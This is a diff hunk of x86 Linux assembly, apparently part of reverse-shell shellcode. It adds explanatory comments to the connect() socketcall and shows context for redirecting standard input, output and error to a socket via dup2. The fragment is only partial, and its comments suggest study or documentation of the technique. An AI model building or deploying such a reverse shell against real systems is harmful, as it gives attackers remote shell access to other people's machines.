@@ -25,13 +25,13 @@ _start:
  mov esi,esp           ; save the location of sockaddr in esi for later
 
 ;connect(sockfd, (struct sockaddr *)&servSA_sin_family, sizeof servSA);
- push 0x10
- push esi
- push edx
- mov ecx,esp
- mov al,0x66
- inc bl
- int 0x80
+ push 0x10             ; sizeof (sockaddr_in)
+ push esi              ; our pointer to our sockaddr_in structure
+ push edx              ; our socket descriptor
+ mov ecx,esp           ; load up our argument list into ecx
+ mov al,0x66           ; value for socketcall (102)
+ inc bl                ; SYS_CONNECT syscall (ebx is now 3) 
+ int 0x80              ; Call connect
 
 ; This section loops through dup2 for STDIN,STDOUT and STDERR
 ; redirecting them to our client socket
